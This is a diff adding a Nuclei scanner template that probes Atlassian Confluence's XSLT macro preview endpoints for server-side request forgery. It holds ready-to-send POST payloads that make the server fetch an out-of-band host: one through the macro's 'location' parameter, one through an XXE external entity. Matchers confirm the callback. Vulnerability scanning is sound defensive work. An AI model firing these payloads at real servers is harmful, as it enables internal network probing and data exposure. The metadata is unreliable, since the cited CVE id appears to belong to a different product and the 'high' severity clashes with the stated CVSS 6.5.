@@ -1,0 +1,81 @@
+id: confluence-xslt-macro-ssrf
+
+info:
+  name: Atlassian Confluence XSLT Macro - Server-Side Request Forgery
+  author: ritikchaddha
+  severity: high
+  description: |
+    Atlassian Confluence Data Center and Server include an XSLT macro feature that may be vulnerable to Server-Side Request Forgery (SSRF). By leveraging the ability of the XSLT macro to access external resources, attackers can potentially cause the server to make HTTP requests to arbitrary URLs. This can allow internal network scanning, access to sensitive systems, or exposure of internal information.
+  reference:
+    - https://jira.atlassian.com/browse/CONFSERVER-101489
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 6.5
+    cve-id: CVE-2024-29415
+    cwe-id: CWE-918
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: atlassian
+    product: confluence
+    fofa-query: icon_hash="-305179312"
+  tags: cve,cve2024,confluence,atlassian,ssrf,xslt,macro
+
+flow: http(1) || http(2)
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
+      - "{{BaseURL}}/rest/api/content/macro/preview"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "macro": {
+          "name": "xslt",
+          "body": "",
+          "params": {
+            "location": "http://{{interactsh-url}}/test.xsl"
+          }
+        }
+      }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "contextConfigLocation")'
+          - 'contains(interactsh_protocol, "http")'
+          - 'status_code == 200'
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
+      - "{{BaseURL}}/rest/api/content/macro/preview"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "macro": {
+          "name": "xslt",
+          "body": "",
+          "params": {
+            "xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{{interactsh-url}}/test'>]><foo>&xxe;</foo>",
+            "xslt": "<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'>Test</xsl:template></xsl:stylesheet>"
+          }
+        }
+      }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "contextConfigLocation")'
+          - 'contains(interactsh_protocol, "http")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4b0a00483046022100a01f44a3fa80506bcd82e2bf8a9f3a9d1060145a50d66e64a05854f2b133ebb2022100efedb50143346b1d5157a29fa3a3a94c16fb8eb6821b297e741e617a3c52b893:922c64590222798bb761d5b6d8e72950
